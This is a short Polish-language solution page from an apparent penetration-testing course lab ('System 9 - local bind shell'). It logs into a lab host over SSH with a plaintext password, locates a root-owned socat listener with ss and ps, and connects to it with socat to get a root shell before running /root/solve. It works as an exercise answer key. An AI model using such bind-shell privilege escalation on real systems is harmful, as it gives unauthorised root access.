---
title: "7.12 - System 9 - lokalny bind shell"
order: 12
---

> **Uwaga do rozwiązania:** Adres `127.0.0.11` i port `54321` są ze źródła. Sprawdź je przez `ss` i `ps` na docelowym systemie9; lokalny adres loopback odnosi się do tej maszyny.

```bash
ssh system9@192.168.100.107 -p 2209 #Password: pjatk
ss -tlpn #Find listening port 54321
ps aux #Find root socat listener
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.11:54321
/root/solve
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw07/cw07_p.md).
